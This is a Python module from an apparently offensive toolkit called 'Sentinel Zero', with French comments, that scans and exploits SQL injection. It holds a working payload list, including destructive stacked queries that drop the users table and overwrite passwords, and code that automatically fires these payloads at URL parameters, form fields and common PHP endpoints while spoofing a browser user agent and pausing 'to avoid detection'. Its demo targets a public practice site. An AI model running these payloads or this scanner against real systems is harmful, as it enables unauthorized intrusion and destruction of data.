#!/usr/bin/env python3
"""
Sentinel Zero - Module d'Injection SQL
Détection et exploitation des vulnérabilités SQL Injection
"""

import requests
import re
import time
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import threading

class SQLInjector:
    """Module d'injection SQL Sentinel Zero"""
    
    def __init__(self):
        self.results = {}
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": self.user_agent})
        
        # Payloads SQL Injection
        self.sql_payloads = [
            # Tests basiques
            "'",
            "''",
            "`",
            "``",
            ",",
            "\\",
            "%27",
            "%25%27",
            "%60",
            "%5C",
            
            # Tests d'erreur
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR (1=1--",
            
            # Tests d'union
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 'a','b','c'--",
            
            # Tests de blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT 1 FROM users LIMIT 1)--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Tests de time-based
            "' AND (SELECT SLEEP(5))--",
            "' AND (SELECT BENCHMARK(1000000,MD5(1)))--",
            "' WAITFOR DELAY '00:00:05'--",
            
            # Tests de stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES (1,'test')--",
            "'; UPDATE users SET password='hacked'--",
        ]
        
        # Patterns d'erreur SQL
        self.error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"mysql.*error",
            r"sql syntax.*mariadb",
            r"oracle.*error",
            r"oracle.*invalid",
            r"postgresql.*error",
            r"postgresql.*invalid",
            r"microsoft.*database.*error",
            r"microsoft.*sql.*server.*error",
            r"sqlserver.*error",
            r"sql.*syntax.*error",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"unterminated string constant",
            r"division by zero",
            r"invalid number",
            r"ora-[0-9]",
            r"mysql.*error.*[0-9]",
            r"postgresql.*error.*[0-9]",
        ]
    
    def scan_target(self, target: str) -> Dict[str, Any]:
        """Scan complet d'une cible pour SQL Injection"""
        print(f"💉 [SENTINEL] Démarrage scan SQL Injection: {target}")
        
        self.results = {
            "target": target,
            "timestamp": time.time(),
            "vulnerable_params": [],
            "vulnerable_urls": [],
            "payloads_tested": [],
            "errors_found": [],
            "databases_detected": [],
            "risk_level": "LOW"
        }
        
        # Analyse de l'URL cible
        parsed_url = urlparse(target)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Test des paramètres dans l'URL
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param in params:
                self.test_parameter(base_url, parsed_url.path, param, params[param][0])
        
        # Test des formulaires
        self.test_forms(target)
        
        # Test des endpoints communs
        self.test_common_endpoints(base_url)
        
        # Évaluation du niveau de risque
        self.evaluate_risk()
        
        print(f"✅ [SENTINEL] Scan SQL Injection terminé: {target}")
        return self.results
    
    def test_parameter(self, base_url: str, path: str, param: str, original_value: str):
        """Test d'un paramètre pour SQL Injection"""
        print(f"🔍 [SENTINEL] Test paramètre: {param}")
        
        for payload in self.sql_payloads:
            try:
                # Construction de l'URL avec payload
                test_params = {param: payload}
                test_url = f"{base_url}{path}?{urlencode(test_params)}"
                
                # Test de la requête
                response = self.session.get(test_url, timeout=10)
                
                # Vérification des erreurs SQL
                if self.detect_sql_error(response.text):
                    vulnerability = {
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "response_code": response.status_code,
                        "error_detected": True
                    }
                    self.results["vulnerable_params"].append(vulnerability)
                    self.results["payloads_tested"].append(payload)
                    
                    # Détection du type de base de données
                    db_type = self.detect_database_type(response.text)
                    if db_type:
                        self.results["databases_detected"].append(db_type)
                
                # Test de blind SQL injection
                if self.test_blind_sql(base_url, path, param, payload):
                    vulnerability = {
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "type": "BLIND_SQL",
                        "response_code": response.status_code
                    }
                    self.results["vulnerable_params"].append(vulnerability)
                
                time.sleep(0.1)  # Délai pour éviter la détection
                
            except Exception as e:
                print(f"❌ [SENTINEL] Erreur test {param}: {str(e)}")
    
    def detect_sql_error(self, content: str) -> bool:
        """Détection d'erreurs SQL dans le contenu"""
        content_lower = content.lower()
        
        for pattern in self.error_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                self.results["errors_found"].append(pattern)
                return True
        
        return False
    
    def detect_database_type(self, content: str) -> Optional[str]:
        """Détection du type de base de données"""
        content_lower = content.lower()
        
        if any(pattern in content_lower for pattern in ["mysql", "mariadb"]):
            return "MySQL/MariaDB"
        elif any(pattern in content_lower for pattern in ["postgresql", "postgres"]):
            return "PostgreSQL"
        elif any(pattern in content_lower for pattern in ["oracle", "ora-"]):
            return "Oracle"
        elif any(pattern in content_lower for pattern in ["sqlserver", "microsoft.*sql"]):
            return "SQL Server"
        elif any(pattern in content_lower for pattern in ["sqlite"]):
            return "SQLite"
        
        return None
    
    def test_blind_sql(self, base_url: str, path: str, param: str, payload: str) -> bool:
        """Test de blind SQL injection"""
        try:
            # Test avec condition vraie
            true_payload = f"{payload} AND 1=1--"
            true_params = {param: true_payload}
            true_url = f"{base_url}{path}?{urlencode(true_params)}"
            true_response = self.session.get(true_url, timeout=10)
            
            # Test avec condition fausse
            false_payload = f"{payload} AND 1=2--"
            false_params = {param: false_payload}
            false_url = f"{base_url}{path}?{urlencode(false_params)}"
            false_response = self.session.get(false_url, timeout=10)
            
            # Comparaison des réponses
            if true_response.status_code != false_response.status_code or \
               len(true_response.text) != len(false_response.text):
                return True
                
        except:
            pass
        
        return False
    
    def test_forms(self, target: str):
        """Test des formulaires pour SQL Injection"""
        try:
            response = self.session.get(target, timeout=10)
            
            # Recherche de formulaires
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
            
            for i, form in enumerate(forms):
                # Recherche des champs input
                input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
                inputs = re.findall(input_pattern, form, re.IGNORECASE)
                
                for input_name in inputs:
                    if input_name.lower() in ['id', 'user', 'username', 'email', 'search', 'q', 'query']:
                        self.test_form_field(target, input_name)
                        
        except Exception as e:
            print(f"❌ [SENTINEL] Erreur test formulaires: {str(e)}")
    
    def test_form_field(self, target: str, field_name: str):
        """Test d'un champ de formulaire"""
        for payload in self.sql_payloads[:10]:  # Test limité pour les formulaires
            try:
                data = {field_name: payload}
                response = self.session.post(target, data=data, timeout=10)
                
                if self.detect_sql_error(response.text):
                    vulnerability = {
                        "form_field": field_name,
                        "payload": payload,
                        "url": target,
                        "type": "FORM_SQL",
                        "response_code": response.status_code
                    }
                    self.results["vulnerable_params"].append(vulnerability)
                    
            except:
                pass
    
    def test_common_endpoints(self, base_url: str):
        """Test des endpoints communs"""
        common_endpoints = [
            "/user.php",
            "/profile.php", 
            "/admin.php",
            "/login.php",
            "/search.php",
            "/product.php",
            "/article.php",
            "/news.php",
            "/blog.php",
            "/page.php"
        ]
        
        for endpoint in common_endpoints:
            test_url = f"{base_url}{endpoint}?id=1"
            self.test_parameter(base_url, endpoint, "id", "1")
    
    def evaluate_risk(self):
        """Évaluation du niveau de risque"""
        risk_score = 0
        
        # Facteurs de risque
        if self.results["vulnerable_params"]:
            risk_score += len(self.results["vulnerable_params"]) * 10
        
        if self.results["errors_found"]:
            risk_score += len(self.results["errors_found"]) * 5
        
        if self.results["databases_detected"]:
            risk_score += len(self.results["databases_detected"]) * 3
        
        # Classification du risque
        if risk_score >= 50:
            self.results["risk_level"] = "CRITICAL"
        elif risk_score >= 30:
            self.results["risk_level"] = "HIGH"
        elif risk_score >= 15:
            self.results["risk_level"] = "MEDIUM"
        else:
            self.results["risk_level"] = "LOW"
        
        self.results["risk_score"] = risk_score
    
    def generate_report(self) -> str:
        """Génération d'un rapport détaillé"""
        report = f"""
=== RAPPORT SQL INJECTION SENTINEL ZERO ===
Cible: {self.results['target']}
Niveau de risque: {self.results['risk_level']} ({self.results.get('risk_score', 0)}/100)
Timestamp: {time.ctime(self.results['timestamp'])}

PARAMÈTRES VULNÉRABLES: {len(self.results['vulnerable_params'])}
"""
        
        for vuln in self.results['vulnerable_params']:
            report += f"""
- Paramètre: {vuln.get('parameter', vuln.get('form_field', 'N/A'))}
- Payload: {vuln['payload']}
- URL: {vuln['url']}
- Type: {vuln.get('type', 'UNKNOWN')}
"""
        
        if self.results['databases_detected']:
            report += f"\nBASES DE DONNÉES DÉTECTÉES: {', '.join(set(self.results['databases_detected']))}"
        
        if self.results['errors_found']:
            report += f"\nERREURS SQL TROUVÉES: {len(self.results['errors_found'])}"
        
        return report

# Fonction d'export pour Sentinel Zero
def run_sql_scan(target: str) -> Dict[str, Any]:
    """Fonction principale pour Sentinel Zero"""
    injector = SQLInjector()
    return injector.scan_target(target)

if __name__ == "__main__":
    # Test du module
    target = "http://testphp.vulnweb.com/artists.php?artist=1"
    results = run_sql_scan(target)
    print(json.dumps(results, indent=2))
    
    # Génération du rapport
    injector = SQLInjector()
    injector.results = results
    print(injector.generate_report()) 